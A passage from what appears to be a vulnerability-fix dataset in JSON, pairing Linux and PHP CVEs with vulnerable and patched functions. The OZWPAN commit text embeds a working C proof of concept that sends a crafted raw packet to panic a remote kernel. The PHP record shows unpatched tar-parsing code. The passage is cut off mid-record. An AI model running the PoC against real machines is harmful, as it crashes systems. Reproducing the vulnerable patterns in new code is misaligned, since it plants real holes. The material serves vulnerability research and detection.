        "description": "The oz_usb_handle_ep_data function in drivers/staging/ozwpan/ozusbsvc1.c in the OZWPAN driver in the Linux kernel through 4.0.5 allows remote attackers to cause a denial of service (divide-by-zero error and system crash) via a crafted packet.",
        "git_url": "https://github.com/torvalds/linux/commit/04bf464a5dfd9ade0dda918e44366c2c61fce80b",
        "commit_title": "ozwpan: divide-by-zero leading to panic",
        "commit_text": " A network supplied parameter was not checked before division, leading to a divide-by-zero. Since this happens in the softirq path, it leads to a crash. A PoC follows below, which requires the ozprotocol.h file from this module.  =-=-=-=-=-=   #include <arpa/inet.h>  #include <linux/if_packet.h>  #include <net/if.h>  #include <netinet/ether.h>  #include <stdio.h>  #include <string.h>  #include <stdlib.h>  #include <endian.h>  #include <sys/ioctl.h>  #include <sys/socket.h>   #define u8 uint8_t  #define u16 uint16_t  #define u32 uint32_t  #define __packed __attribute__((__packed__))  #include \"ozprotocol.h\"  static int hex2num(char c) { \tif (c >= '0' && c <= '9') \t\treturn c - '0'; \tif (c >= 'a' && c <= 'f') \t\treturn c - 'a' + 10; \tif (c >= 'A' && c <= 'F') \t\treturn c - 'A' + 10; \treturn -1; } static int hwaddr_aton(const char *txt, uint8_t *addr) { \tint i; \tfor (i = 0; i < 6; i++) { \t\tint a, b; \t\ta = hex2num(*txt++); \t\tif (a < 0) \t\t\treturn -1; \t\tb = hex2num(*txt++); \t\tif (b < 0) \t\t\treturn -1; \t\t*addr++ = (a << 4) | b; \t\tif (i < 5 && *txt++ != ':') \t\t\treturn -1; \t} \treturn 0; }  int main(int argc, char *argv[]) { \tif (argc < 3) { \t\tfprintf(stderr, \"Usage: %s interface destination_mac\\n\", argv[0]); \t\treturn 1; \t}  \tuint8_t dest_mac[6]; \tif (hwaddr_aton(argv[2], dest_mac)) { \t\tfprintf(stderr, \"Invalid mac address.\\n\"); \t\treturn 1; \t}  \tint sockfd = socket(AF_PACKET, SOCK_RAW, IPPROTO_RAW); \tif (sockfd < 0) { \t\tperror(\"socket\"); \t\treturn 1; \t}  \tstruct ifreq if_idx; \tint interface_index; \tstrncpy(if_idx.ifr_ifrn.ifrn_name, argv[1], IFNAMSIZ - 1); \tif (ioctl(sockfd, SIOCGIFINDEX, &if_idx) < 0) { \t\tperror(\"SIOCGIFINDEX\"); \t\treturn 1; \t} \tinterface_index = if_idx.ifr_ifindex; \tif (ioctl(sockfd, SIOCGIFHWADDR, &if_idx) < 0) { \t\tperror(\"SIOCGIFHWADDR\"); \t\treturn 1; \t} \tuint8_t *src_mac = (uint8_t *)&if_idx.ifr_hwaddr.sa_data;  \tstruct { \t\tstruct ether_header ether_header; \t\tstruct oz_hdr oz_hdr; \t\tstruct oz_elt oz_elt; \t\tstruct oz_elt_connect_req oz_elt_connect_req; \t\tstruct oz_elt oz_elt2; \t\tstruct oz_multiple_fixed oz_multiple_fixed; \t} __packed packet = { \t\t.ether_header = { \t\t\t.ether_type = htons(OZ_ETHERTYPE), \t\t\t.ether_shost = { src_mac[0], src_mac[1], src_mac[2], src_mac[3], src_mac[4], src_mac[5] }, \t\t\t.ether_dhost = { dest_mac[0], dest_mac[1], dest_mac[2], dest_mac[3], dest_mac[4], dest_mac[5] } \t\t}, \t\t.oz_hdr = { \t\t\t.control = OZ_F_ACK_REQUESTED | (OZ_PROTOCOL_VERSION << OZ_VERSION_SHIFT), \t\t\t.last_pkt_num = 0, \t\t\t.pkt_num = htole32(0) \t\t}, \t\t.oz_elt = { \t\t\t.type = OZ_ELT_CONNECT_REQ, \t\t\t.length = sizeof(struct oz_elt_connect_req) \t\t}, \t\t.oz_elt_connect_req = { \t\t\t.mode = 0, \t\t\t.resv1 = {0}, \t\t\t.pd_info = 0, \t\t\t.session_id = 0, \t\t\t.presleep = 0, \t\t\t.ms_isoc_latency = 0, \t\t\t.host_vendor = 0, \t\t\t.keep_alive = 0, \t\t\t.apps = htole16((1 << OZ_APPID_USB) | 0x1), \t\t\t.max_len_div16 = 0, \t\t\t.ms_per_isoc = 0, \t\t\t.up_audio_buf = 0, \t\t\t.ms_per_elt = 0 \t\t}, \t\t.oz_elt2 = { \t\t\t.type = OZ_ELT_APP_DATA, \t\t\t.length = sizeof(struct oz_multiple_fixed) \t\t}, \t\t.oz_multiple_fixed = { \t\t\t.app_id = OZ_APPID_USB, \t\t\t.elt_seq_num = 0, \t\t\t.type = OZ_USB_ENDPOINT_DATA, \t\t\t.endpoint = 0, \t\t\t.format = OZ_DATA_F_MULTIPLE_FIXED, \t\t\t.unit_size = 0, \t\t\t.data = {0} \t\t} \t};  \tstruct sockaddr_ll socket_address = { \t\t.sll_ifindex = interface_index, \t\t.sll_halen = ETH_ALEN, \t\t.sll_addr = { dest_mac[0], dest_mac[1], dest_mac[2], dest_mac[3], dest_mac[4], dest_mac[5] } \t};  \tif (sendto(sockfd, &packet, sizeof(packet), 0, (struct sockaddr *)&socket_address, sizeof(socket_address)) < 0) { \t\tperror(\"sendto\"); \t\treturn 1; \t} \treturn 0; }  Cc: stable <stable@vger.kernel.org>",
        "func_before": "static void oz_usb_handle_ep_data(struct oz_usb_ctx *usb_ctx,\n\tstruct oz_usb_hdr *usb_hdr, int len)\n{\n\tstruct oz_data *data_hdr = (struct oz_data *)usb_hdr;\n\n\tswitch (data_hdr->format) {\n\tcase OZ_DATA_F_MULTIPLE_FIXED: {\n\t\t\tstruct oz_multiple_fixed *body =\n\t\t\t\t(struct oz_multiple_fixed *)data_hdr;\n\t\t\tu8 *data = body->data;\n\t\t\tint n = (len - sizeof(struct oz_multiple_fixed)+1)\n\t\t\t\t/ body->unit_size;\n\t\t\twhile (n--) {\n\t\t\t\toz_hcd_data_ind(usb_ctx->hport, body->endpoint,\n\t\t\t\t\tdata, body->unit_size);\n\t\t\t\tdata += body->unit_size;\n\t\t\t}\n\t\t}\n\t\tbreak;\n\tcase OZ_DATA_F_ISOC_FIXED: {\n\t\t\tstruct oz_isoc_fixed *body =\n\t\t\t\t(struct oz_isoc_fixed *)data_hdr;\n\t\t\tint data_len = len-sizeof(struct oz_isoc_fixed)+1;\n\t\t\tint unit_size = body->unit_size;\n\t\t\tu8 *data = body->data;\n\t\t\tint count;\n\t\t\tint i;\n\n\t\t\tif (!unit_size)\n\t\t\t\tbreak;\n\t\t\tcount = data_len/unit_size;\n\t\t\tfor (i = 0; i < count; i++) {\n\t\t\t\toz_hcd_data_ind(usb_ctx->hport,\n\t\t\t\t\tbody->endpoint, data, unit_size);\n\t\t\t\tdata += unit_size;\n\t\t\t}\n\t\t}\n\t\tbreak;\n\t}\n\n}",
        "func": "static void oz_usb_handle_ep_data(struct oz_usb_ctx *usb_ctx,\n\tstruct oz_usb_hdr *usb_hdr, int len)\n{\n\tstruct oz_data *data_hdr = (struct oz_data *)usb_hdr;\n\n\tswitch (data_hdr->format) {\n\tcase OZ_DATA_F_MULTIPLE_FIXED: {\n\t\t\tstruct oz_multiple_fixed *body =\n\t\t\t\t(struct oz_multiple_fixed *)data_hdr;\n\t\t\tu8 *data = body->data;\n\t\t\tint n;\n\t\t\tif (!body->unit_size)\n\t\t\t\tbreak;\n\t\t\tn = (len - sizeof(struct oz_multiple_fixed)+1)\n\t\t\t\t/ body->unit_size;\n\t\t\twhile (n--) {\n\t\t\t\toz_hcd_data_ind(usb_ctx->hport, body->endpoint,\n\t\t\t\t\tdata, body->unit_size);\n\t\t\t\tdata += body->unit_size;\n\t\t\t}\n\t\t}\n\t\tbreak;\n\tcase OZ_DATA_F_ISOC_FIXED: {\n\t\t\tstruct oz_isoc_fixed *body =\n\t\t\t\t(struct oz_isoc_fixed *)data_hdr;\n\t\t\tint data_len = len-sizeof(struct oz_isoc_fixed)+1;\n\t\t\tint unit_size = body->unit_size;\n\t\t\tu8 *data = body->data;\n\t\t\tint count;\n\t\t\tint i;\n\n\t\t\tif (!unit_size)\n\t\t\t\tbreak;\n\t\t\tcount = data_len/unit_size;\n\t\t\tfor (i = 0; i < count; i++) {\n\t\t\t\toz_hcd_data_ind(usb_ctx->hport,\n\t\t\t\t\tbody->endpoint, data, unit_size);\n\t\t\t\tdata += unit_size;\n\t\t\t}\n\t\t}\n\t\tbreak;\n\t}\n\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -8,7 +8,10 @@\n \t\t\tstruct oz_multiple_fixed *body =\n \t\t\t\t(struct oz_multiple_fixed *)data_hdr;\n \t\t\tu8 *data = body->data;\n-\t\t\tint n = (len - sizeof(struct oz_multiple_fixed)+1)\n+\t\t\tint n;\n+\t\t\tif (!body->unit_size)\n+\t\t\t\tbreak;\n+\t\t\tn = (len - sizeof(struct oz_multiple_fixed)+1)\n \t\t\t\t/ body->unit_size;\n \t\t\twhile (n--) {\n \t\t\t\toz_hcd_data_ind(usb_ctx->hport, body->endpoint,",
        "diff_line_info": {
            "deleted_lines": [
                "\t\t\tint n = (len - sizeof(struct oz_multiple_fixed)+1)"
            ],
            "added_lines": [
                "\t\t\tint n;",
                "\t\t\tif (!body->unit_size)",
                "\t\t\t\tbreak;",
                "\t\t\tn = (len - sizeof(struct oz_multiple_fixed)+1)"
            ]
        }
    },
    {
        "cve_id": "CVE-2015-4021",
        "func_name": "php/php-src/phar_parse_tarfile",
        "description": "The phar_parse_tarfile function in ext/phar/tar.c in PHP before 5.4.41, 5.5.x before 5.5.25, and 5.6.x before 5.6.9 does not verify that the first character of a filename is different from the \\0 character, which allows remote attackers to cause a denial of service (integer underflow and memory corruption) via a crafted entry in a tar archive.",
        "git_url": "https://github.com/php/php-src/commit/2c1e49075ba48d93439a9e79eae43d9f8469b832",
        "commit_title": "Fix bug #69453 - don't try to cut empty string",
        "commit_text": "",
        "func_before": "int phar_parse_tarfile(php_stream* fp, char *fname, int fname_len, char *alias, int alias_len, phar_archive_data** pphar, int is_data, php_uint32 compression, char **error TSRMLS_DC) /* {{{ */\n{\n\tchar buf[512], *actual_alias = NULL, *p;\n\tphar_entry_info entry = {0};\n\tsize_t pos = 0, read, totalsize;\n\ttar_header *hdr;\n\tphp_uint32 sum1, sum2, size, old;\n\tphar_archive_data *myphar, **actual;\n\tint last_was_longlink = 0;\n\n\tif (error) {\n\t\t*error = NULL;\n\t}\n\n\tphp_stream_seek(fp, 0, SEEK_END);\n\ttotalsize = php_stream_tell(fp);\n\tphp_stream_seek(fp, 0, SEEK_SET);\n\tread = php_stream_read(fp, buf, sizeof(buf));\n\n\tif (read != sizeof(buf)) {\n\t\tif (error) {\n\t\t\tspprintf(error, 4096, \"phar error: \\\"%s\\\" is not a tar file or is truncated\", fname);\n\t\t}\n\t\tphp_stream_close(fp);\n\t\treturn FAILURE;\n\t}\n\n\thdr = (tar_header*)buf;\n\told = (memcmp(hdr->magic, \"ustar\", sizeof(\"ustar\")-1) != 0);\n\n\tmyphar = (phar_archive_data *) pecalloc(1, sizeof(phar_archive_data), PHAR_G(persist));\n\tmyphar->is_persistent = PHAR_G(persist);\n\t/* estimate number of entries, can't be certain with tar files */\n\tzend_hash_init(&myphar->manifest, 2 + (totalsize >> 12),\n\t\tzend_get_hash_value, destroy_phar_manifest_entry, (zend_bool)myphar->is_persistent);\n\tzend_hash_init(&myphar->mounted_dirs, 5,\n\t\tzend_get_hash_value, NULL, (zend_bool)myphar->is_persistent);\n\tzend_hash_init(&myphar->virtual_dirs, 4 + (totalsize >> 11),\n\t\tzend_get_hash_value, NULL, (zend_bool)myphar->is_persistent);\n\tmyphar->is_tar = 1;\n\t/* remember whether this entire phar was compressed with gz/bzip2 */\n\tmyphar->flags = compression;\n\n\tentry.is_tar = 1;\n\tentry.is_crc_checked = 1;\n\tentry.phar = myphar;\n\tpos += sizeof(buf);\n\n\tdo {\n\t\tphar_entry_info *newentry;\n\n\t\tpos = php_stream_tell(fp);\n\t\thdr = (tar_header*) buf;\n\t\tsum1 = phar_tar_number(hdr->checksum, sizeof(hdr->checksum));\n\t\tif (sum1 == 0 && phar_tar_checksum(buf, sizeof(buf)) == 0) {\n\t\t\tbreak;\n\t\t}\n\t\tmemset(hdr->checksum, ' ', sizeof(hdr->checksum));\n\t\tsum2 = phar_tar_checksum(buf, old?sizeof(old_tar_header):sizeof(tar_header));\n\n\t\tsize = entry.uncompressed_filesize = entry.compressed_filesize =\n\t\t\tphar_tar_number(hdr->size, sizeof(hdr->size));\n\n\t\t/* skip global/file headers (pax) */\n\t\tif (!old && (hdr->typeflag == TAR_GLOBAL_HDR || hdr->typeflag == TAR_FILE_HDR)) {\n\t\t\tsize = (size+511)&~511;\n\t\t\tgoto next;\n\t\t}\n\n\t\tif (((!old && hdr->prefix[0] == 0) || old) && strlen(hdr->name) == sizeof(\".phar/signature.bin\")-1 && !strncmp(hdr->name, \".phar/signature.bin\", sizeof(\".phar/signature.bin\")-1)) {\n\t\t\toff_t curloc;\n\n\t\t\tif (size > 511) {\n\t\t\t\tif (error) {\n\t\t\t\t\tspprintf(error, 4096, \"phar error: tar-based phar \\\"%s\\\" has signature that is larger than 511 bytes, cannot process\", fname);\n\t\t\t\t}\nbail:\n\t\t\t\tphp_stream_close(fp);\n\t\t\t\tphar_destroy_phar_data(myphar TSRMLS_CC);\n\t\t\t\treturn FAILURE;\n\t\t\t}\n\t\t\tcurloc = php_stream_tell(fp);\n\t\t\tread = php_stream_read(fp, buf, size);\n\t\t\tif (read != size) {\n\t\t\t\tif (error) {\n\t\t\t\t\tspprintf(error, 4096, \"phar error: tar-based phar \\\"%s\\\" signature cannot be read\", fname);\n\t\t\t\t}\n\t\t\t\tgoto bail;\n\t\t\t}\n#ifdef WORDS_BIGENDIAN\n# define PHAR_GET_32(buffer) \\\n\t(((((unsigned char*)(buffer))[3]) << 24) \\\n\t\t| ((((unsigned char*)(buffer))[2]) << 16) \\\n\t\t| ((((unsigned char*)(buffer))[1]) <<  8) \\\n\t\t| (((unsigned char*)(buffer))[0]))\n#else\n# define PHAR_GET_32(buffer) (php_uint32) *(buffer)\n#endif\n\t\t\tmyphar->sig_flags = PHAR_GET_32(buf);\n\t\t\tif (FAILURE == phar_verify_signature(fp, php_stream_tell(fp) - size - 512, myphar->sig_flags, buf + 8, size - 8, fname, &myphar->signature, &myphar->sig_len, error TSRMLS_CC)) {\n\t\t\t\tif (error) {\n\t\t\t\t\tchar *save = *error;\n\t\t\t\t\tspprintf(error, 4096, \"phar error: tar-based phar \\\"%s\\\" signature cannot be verified: %s\", fname, save);\n\t\t\t\t\tefree(save);\n\t\t\t\t}\n\t\t\t\tgoto bail;\n\t\t\t}\n\t\t\tphp_stream_seek(fp, curloc + 512, SEEK_SET);\n\t\t\t/* signature checked out, let's ensure this is the last file in the phar */\n\t\t\tif (((hdr->typeflag == '\\0') || (hdr->typeflag == TAR_FILE)) && size > 0) {\n\t\t\t\t/* this is not good enough - seek succeeds even on truncated tars */\n\t\t\t\tphp_stream_seek(fp, 512, SEEK_CUR);\n\t\t\t\tif ((uint)php_stream_tell(fp) > totalsize) {\n\t\t\t\t\tif (error) {\n\t\t\t\t\t\tspprintf(error, 4096, \"phar error: \\\"%s\\\" is a corrupted tar file (truncated)\", fname);\n\t\t\t\t\t}\n\t\t\t\t\tphp_stream_close(fp);\n\t\t\t\t\tphar_destroy_phar_data(myphar TSRMLS_CC);\n\t\t\t\t\treturn FAILURE;\n\t\t\t\t}\n\t\t\t}\n\n\t\t\tread = php_stream_read(fp, buf, sizeof(buf));\n\n\t\t\tif (read != sizeof(buf)) {\n\t\t\t\tif (error) {\n\t\t\t\t\tspprintf(error, 4096, \"phar error: \\\"%s\\\" is a corrupted tar file (truncated)\", fname);\n\t\t\t\t}\n\t\t\t\tphp_stream_close(fp);\n\t\t\t\tphar_destroy_phar_data(myphar TSRMLS_CC);\n\t\t\t\treturn FAILURE;\n\t\t\t}\n\n\t\t\thdr = (tar_header*) buf;\n\t\t\tsum1 = phar_tar_number(hdr->checksum, sizeof(hdr->checksum));\n\n\t\t\tif (sum1 == 0 && phar_tar_checksum(buf, sizeof(buf)) == 0) {\n\t\t\t\tbreak;\n\t\t\t}\n\n\t\t\tif (error) {\n\t\t\t\tspprintf(error, 4096, \"phar error: \\\"%s\\\" has entries after signature, invalid phar\", fname);\n\t\t\t}\n\n\t\t\tgoto bail;\n\t\t}\n\n\t\tif (!last_was_longlink && hdr->typeflag == 'L') {\n\t\t\tlast_was_longlink = 1;\n\t\t\t/* support the ././@LongLink system for storing long filenames */\n\t\t\tentry.filename_len = entry.uncompressed_filesize;\n\n\t\t\t/* Check for overflow - bug 61065 */\n\t\t\tif (entry.filename_len == UINT_MAX) {\n\t\t\t\tif (error) {\n\t\t\t\t\tspprintf(error, 4096, \"phar error: \\\"%s\\\" is a corrupted tar file (invalid entry size)\", fname);\n\t\t\t\t}\n\t\t\t\tphp_stream_close(fp);\n\t\t\t\tphar_destroy_phar_data(myphar TSRMLS_CC);\n\t\t\t\treturn FAILURE;\n\t\t\t}\n\t\t\tentry.filename = pemalloc(entry.filename_len+1, myphar->is_persistent);\n\n\t\t\tread = php_stream_read(fp, entry.filename, entry.filename_len);\n\t\t\tif (read != entry.filename_len) {\n\t\t\t\tefree(entry.filename);\n\t\t\t\tif (error) {\n\t\t\t\t\tspprintf(error, 4096, \"phar error: \\\"%s\\\" is a corrupted tar file (truncated)\", fname);\n\t\t\t\t}\n\t\t\t\tphp_stream_close(fp);\n\t\t\t\tphar_destroy_phar_data(myphar TSRMLS_CC);\n\t\t\t\treturn FAILURE;\n\t\t\t}\n\t\t\tentry.filename[entry.filename_len] = '\\0';\n\n\t\t\t/* skip blank stuff */\n\t\t\tsize = ((size+511)&~511) - size;\n\n\t\t\t/* this is not good enough - seek succeeds even on truncated tars */\n\t\t\tphp_stream_seek(fp, size, SEEK_CUR);\n\t\t\tif ((uint)php_stream_tell(fp) > totalsize) {\n\t\t\t\tefree(entry.filename);\n\t\t\t\tif (error) {\n\t\t\t\t\tspprintf(error, 4096, \"phar error: \\\"%s\\\" is a corrupted tar file (truncated)\", fname);\n\t\t\t\t}\n\t\t\t\tphp_stream_close(fp);\n\t\t\t\tphar_destroy_phar_data(myphar TSRMLS_CC);\n\t\t\t\treturn FAILURE;\n\t\t\t}\n\n\t\t\tread = php_stream_read(fp, buf, sizeof(buf));\n\n\t\t\tif (read != sizeof(buf)) {\n\t\t\t\tefree(entry.filename);\n\t\t\t\tif (error) {\n\t\t\t\t\tspprintf(error, 4096, \"phar error: \\\"%s\\\" is a corrupted tar file (truncated)\", fname);\n\t\t\t\t}\n\t\t\t\tphp_stream_close(fp);\n\t\t\t\tphar_destroy_phar_data(myphar TSRMLS_CC);\n\t\t\t\treturn FAILURE;\n\t\t\t}\n\t\t\tcontinue;\n\t\t} else if (!last_was_longlink && !old && hdr->prefix[0] != 0) {\n\t\t\tchar name[256];\n\t\t\tint i, j;\n\n\t\t\tfor (i = 0; i < 155; i++) {\n\t\t\t\tname[i] = hdr->prefix[i];\n\t\t\t\tif (name[i] == '\\0') {\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t}\n\t\t\tname[i++] = '/';\n\t\t\tfor (j = 0; j < 100; j++) {\n\t\t\t\tname[i+j] = hdr->name[j];\n\t\t\t\tif (name[i+j] == '\\0') {\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t}\n\n\t\t\tentry.filename_len = i+j;\n\n\t\t\tif (name[entry.filename_len - 1] == '/') {\n\t\t\t\t/* some tar programs store directories with trailing slash */\n\t\t\t\tentry.filename_len--;\n\t\t\t}\n\t\t\tentry.filename = pestrndup(name, entry.filename_len, myphar->is_persistent);\n\t\t} else if (!last_was_longlink) {\n\t\t\tint i;\n\n\t\t\t/* calculate strlen, which can be no longer than 100 */\n\t\t\tfor (i = 0; i < 100; i++) {\n\t\t\t\tif (hdr->name[i] == '\\0') {\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t}\n\t\t\tentry.filename_len = i;\n\t\t\tentry.filename = pestrndup(hdr->name, i, myphar->is_persistent);\n\n\t\t\tif (entry.filename[entry.filename_len - 1] == '/') {\n\t\t\t\t/* some tar programs store directories with trailing slash */\n\t\t\t\tentry.filename[entry.filename_len - 1] = '\\0';\n\t\t\t\tentry.filename_len--;\n\t\t\t}\n\t\t}\n\t\tlast_was_longlink = 0;\n\n\t\tphar_add_virtual_dirs(myphar, entry.filename, entry.filename_len TSRMLS_CC);\n\n\t\tif (sum1 != sum2) {\n\t\t\tif (error) {\n\t\t\t\tspprintf(error, 4096, \"phar error: \\\"%s\\\" is a corrupted tar file (checksum mismatch of file \\\"%s\\\")\", fname, entry.filename);\n\t\t\t}\n\t\t\tpefree(entry.filename, myphar->is_persistent);\n\t\t\tphp_stream_close(fp);\n\t\t\tphar_destroy_phar_data(myphar TSRMLS_CC);\n\t\t\treturn FAILURE;\n\t\t}\n\n\t\tentry.tar_type = ((old & (hdr->typeflag == '\\0')) ? TAR_FILE : hdr->typeflag);\n\t\tentry.offset = entry.offset_abs = pos; /* header_offset unused in tar */\n\t\tentry.fp_type = PHAR_FP;\n\t\tentry.flags = phar_tar_number(hdr->mode, sizeof(hdr->mode)) & PHAR_ENT_PERM_MASK;\n\t\tentry.timestamp = phar_tar_number(hdr->mtime, sizeof(hdr->mtime));\n\t\tentry.is_persistent = myphar->is_persistent;\n#ifndef S_ISDIR\n#define S_ISDIR(mode)\t(((mode)&S_IFMT) == S_IFDIR)\n#endif\n\t\tif (old && entry.tar_type == TAR_FILE && S_ISDIR(entry.flags)) {\n\t\t\tentry.tar_type = TAR_DIR;\n\t\t}\n\n\t\tif (entry.tar_type == TAR_DIR) {\n\t\t\tentry.is_dir = 1;\n\t\t} else {\n\t\t\tentry.is_dir = 0;\n\t\t}\n\n\t\tentry.link = NULL;\n\n\t\tif (entry.tar_type == TAR_LINK) {\n\t\t\tif (!zend_hash_exists(&myphar->manifest, hdr->linkname, strlen(hdr->linkname))) {\n\t\t\t\tif (error) {\n\t\t\t\t\tspprintf(error, 4096, \"phar error: \\\"%s\\\" is a corrupted tar file - hard link to non-existent file \\\"%s\\\"\", fname, hdr->linkname);\n\t\t\t\t}\n\t\t\t\tpefree(entry.filename, entry.is_persistent);\n\t\t\t\tphp_stream_close(fp);\n\t\t\t\tphar_destroy_phar_data(myphar TSRMLS_CC);\n\t\t\t\treturn FAILURE;\n\t\t\t}\n\t\t\tentry.link = estrdup(hdr->linkname);\n\t\t} else if (entry.tar_type == TAR_SYMLINK) {\n\t\t\tentry.link = estrdup(hdr->linkname);\n\t\t}\n\t\tphar_set_inode(&entry TSRMLS_CC);\n\t\tzend_hash_add(&myphar->manifest, entry.filename, entry.filename_len, (void*)&entry, sizeof(phar_entry_info), (void **) &newentry);\n\n\t\tif (entry.is_persistent) {\n\t\t\t++entry.manifest_pos;\n\t\t}\n\n\t\tif (entry.filename_len >= sizeof(\".phar/.metadata\")-1 && !memcmp(entry.filename, \".phar/.metadata\", sizeof(\".phar/.metadata\")-1)) {\n\t\t\tif (FAILURE == phar_tar_process_metadata(newentry, fp TSRMLS_CC)) {\n\t\t\t\tif (error) {\n\t\t\t\t\tspprintf(error, 4096, \"phar error: tar-based phar \\\"%s\\\" has invalid metadata in magic file \\\"%s\\\"\", fname, entry.filename);\n\t\t\t\t}\n\t\t\t\tphp_stream_close(fp);\n\t\t\t\tphar_destroy_phar_data(myphar TSRMLS_CC);\n\t\t\t\treturn FAILURE;\n\t\t\t}\n\t\t}\n\n\t\tif (!actual_alias && entry.filename_len == sizeof(\".phar/alias.txt\")-1 && !strncmp(entry.filename, \".phar/alias.txt\", sizeof(\".phar/alias.txt\")-1)) {\n\t\t\t/* found explicit alias */\n\t\t\tif (size > 511) {\n\t\t\t\tif (error) {\n\t\t\t\t\tspprintf(error, 4096, \"phar error: tar-based phar \\\"%s\\\" has alias that is larger than 511 bytes, cannot process\", fname);\n\t\t\t\t}\n\t\t\t\tphp_stream_close(fp);\n\t\t\t\tphar_destroy_phar_data(myphar TSRMLS_CC);\n\t\t\t\treturn FAILURE;\n\t\t\t}\n\n\t\t\tread = php_stream_read(fp, buf, size);\n\n\t\t\tif (read == size) {\n\t\t\t\tbuf[size] = '\\0';\n\t\t\t\tif (!phar_validate_alias(buf, size)) {\n\t\t\t\t\tif (size > 50) {\n\t\t\t\t\t\tbuf[50] = '.';\n\t\t\t\t\t\tbuf[51] = '.';\n\t\t\t\t\t\tbuf[52] = '.';\n\t\t\t\t\t\tbuf[53] = '\\0';\n\t\t\t\t\t}\n\n\t\t\t\t\tif (error) {\n\t\t\t\t\t\tspprintf(error, 4096, \"phar error: invalid alias \\\"%s\\\" in tar-based phar \\\"%s\\\"\", buf, fname);\n\t\t\t\t\t}\n\n\t\t\t\t\tphp_stream_close(fp);\n\t\t\t\t\tphar_destroy_phar_data(myphar TSRMLS_CC);\n\t\t\t\t\treturn FAILURE;\n\t\t\t\t}\n\n\t\t\t\tactual_alias = pestrndup(buf, size, myphar->is_persistent);\n\t\t\t\tmyphar->alias = actual_alias;\n\t\t\t\tmyphar->alias_len = size;\n\t\t\t\tphp_stream_seek(fp, pos, SEEK_SET);\n\t\t\t} else {\n\t\t\t\tif (error) {\n\t\t\t\t\tspprintf(error, 4096, \"phar error: Unable to read alias from tar-based phar \\\"%s\\\"\", fname);\n\t\t\t\t}\n\n\t\t\t\tphp_stream_close(fp);\n\t\t\t\tphar_destroy_phar_data(myphar TSRMLS_CC);\n\t\t\t\treturn FAILURE;\n\t\t\t}\n\t\t}\n\n\t\tsize = (size+511)&~511;\n\n\t\tif (((hdr->typeflag == '\\0') || (hdr->typeflag == TAR_FILE)) && size > 0) {\nnext:\n\t\t\t/* this is not good enough - seek succeeds even on truncated tars */\n\t\t\tphp_stream_seek(fp, size, SEEK_CUR);\n\t\t\tif ((uint)php_stream_tell(fp) > totalsize) {\n\t\t\t\tif (error) {\n\t\t\t\t\tspprintf(error, 4096, \"phar error: \\\"%s\\\" is a corrupted tar file (truncated)\", fname);\n\t\t\t\t}\n\t\t\t\tphp_stream_close(fp);\n\t\t\t\tphar_destroy_phar_data(myphar TSRMLS_CC);\n\t\t\t\treturn FAILURE;\n\t\t\t}\n\t\t}\n\n\t\tread = php_stream_read(fp, buf, sizeof(buf));\n\n\t\tif (read != sizeof(buf)) {\n\t\t\tif (error) {\n\t\t\t\tspprintf(error, 4096, \"phar error: \\\"%s\\\" is a corrupted tar file (truncated)\", fname);\n\t\t\t}\n\t\t\tphp_stream_close(fp);\n\t\t\tphar_destroy_phar_data(myphar TSRMLS_CC);\n\t\t\treturn FAILURE;\n\t\t}\n\t} while (read != 0);\n\n\tif (zend_hash_exists(&(myphar->manifest), \".phar/stub.php\", sizeof(\".phar/stub.php\")-1)) {\n\t\tmyphar->is_data = 0;\n\t} else {\n\t\tmyphar->is_data = 1;\n\t}\n\n\t/* ensure signature set */\n\tif (!myphar->is_data && PHAR_G(require_hash) && !myphar->signature) {\n\t\tphp_stream_close(fp);\n\t\tphar_destroy_phar_data(myphar TSRMLS_CC);\n\t\tif (error) {\n\t\t\tspprintf(error, 0, \"tar-based phar \\\"%s\\\" does not have a signature\", fname);\n\t\t}\n\t\treturn FAILURE;\n\t}\n\n\tmyphar->fname = pestrndup(fname, fname_len, myphar->is_persistent);\n#ifdef PHP_WIN32\n\tphar_unixify_path_separators(myphar->fname, fname_len);\n#endif\n\tmyphar->fname_len = fname_len;\n\tmyphar->fp = fp;\n\tp = strrchr(myphar->fname, '/');\n\n\tif (p) {\n\t\tmyphar->ext = memchr(p, '.', (myphar->fname + fname_len) - p);\n\t\tif (myphar->ext == p) {\n\t\t\tmyphar->ext = memchr(p + 1, '.', (myphar->fname + fname_len) - p - 1);\n\t\t}\n\t\tif (myphar->ext) {\n\t\t\tmyphar->ext_len = (myphar->fname + fname_len) - myphar->ext;\n\t\t}\n\t}\n\n\tphar_request_initialize(TSRMLS_C);\n\n\tif (SUCCESS != zend_hash_add(&(PHAR_GLOBALS->phar_fname_map), myphar->fname, fname_len, (void*)&myphar, sizeof(phar_archive_data*), (void **)&actual)) {\n\t\tif (error) {\n\t\t\tspprintf(error, 4096, \"phar error: Unable to add tar-based phar \\\"%s\\\" to phar registry\", fname);\n\t\t}\n\t\tphp_stream_close(fp);\n\t\tphar_destroy_phar_data(myphar TSRMLS_CC);\n\t\treturn FAILURE;\n\t}\n\n\tmyphar = *actual;\n\n\tif (actual_alias) {\n\t\tphar_archive_data **fd_ptr;\n\n\t\tmyphar->is_temporary_alias = 0;\n\n\t\tif (SUCCESS == zend_hash_find(&(PHAR_GLOBALS->phar_alias_map), actual_alias, myphar->alias_len, (void **)&fd_ptr)) {\n\t\t\tif (SUCCESS != phar_free_alias(*fd_ptr, actual_alias, myphar->alias_len TSRMLS_CC)) {\n\t\t\t\tif (error) {\n\t\t\t\t\tspprintf(error, 4096, \"phar error: Unable to add tar-based phar \\\"%s\\\", alias is already in use\", fname);\n\t\t\t\t}\n\t\t\t\tzend_hash_del(&(PHAR_GLOBALS->phar_fname_map), myphar->fname, fname_len);\n\t\t\t\treturn FAILURE;\n\t\t\t}\n\t\t}\n\n\t\tzend_hash_add(&(PHAR_GLOBALS->phar_alias_map), actual_alias, myphar->alias_len, (void*)&myphar, sizeof(phar_archive_data*), NULL);\n\t} else {\n\t\tphar_archive_data **fd_ptr;\n\n\t\tif (alias_len) {\n\t\t\tif (SUCCESS == zend_hash_find(&(PHAR_GLOBALS->phar_alias_map), alias, alias_len, (void **)&fd_ptr)) {\n\t\t\t\tif (SUCCESS != phar_free_alias(*fd_ptr, alias, alias_len TSRMLS_CC)) {\n\t\t\t\t\tif (error) {\n\t\t\t\t\t\tspprintf(error, 4096, \"phar error: Unable to add tar-based phar \\\"%s\\\", alias is already in use\", 